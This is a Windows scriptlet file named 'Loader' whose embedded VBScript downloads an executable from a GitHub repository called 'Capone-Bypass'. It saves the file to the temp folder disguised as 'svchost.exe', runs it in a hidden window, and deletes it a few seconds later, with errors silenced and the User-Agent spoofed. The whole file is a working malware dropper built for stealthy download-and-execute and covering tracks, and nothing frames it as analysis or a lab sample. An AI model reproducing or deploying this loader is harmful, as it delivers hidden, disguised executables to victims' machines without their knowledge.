<?XML version="1.0"?>
<scriptlet>
<registration
    description="Loader"
    progid="Loader"
    version="1.00"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}"
    remotable="true">
    
    <script language="VBScript">
        <![CDATA[
            Set objShell = CreateObject("WScript.Shell")
            Set objFSO = CreateObject("Scripting.FileSystemObject")
            
            ' Download URL
            strURL = "https://raw.githubusercontent.com/sircapone1306-wq/Capone-Bypass/main/LilithClicker.exe"
            
            ' Temp file path
            strTemp = objShell.ExpandEnvironmentStrings("%TEMP%") & "\svchost.exe"
            
            On Error Resume Next
            
            ' Use WinHTTP instead of MSXML2
            Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
            objHTTP.Open "GET", strURL, False
            objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0"
            objHTTP.Send
            
            If objHTTP.Status = 200 Then
                ' Write binary data directly
                Set objStream = CreateObject("ADODB.Stream")
                objStream.Mode = 3
                objStream.Type = 1
                objStream.Open
                objStream.Write objHTTP.ResponseBody
                objStream.Position = 0
                objStream.SaveToFile strTemp, 2
                objStream.Close
                
                ' Execute
                objShell.Run """" & strTemp & """", 0, False
                
                ' Cleanup after delay
                WScript.Sleep 3000
                On Error Resume Next
                objFSO.DeleteFile strTemp, True
            End If
            
            Set objStream = Nothing
            Set objHTTP = Nothing
            Set objFSO = Nothing
            Set objShell = Nothing
        ]]>
    </script>
</registration>
</scriptlet>
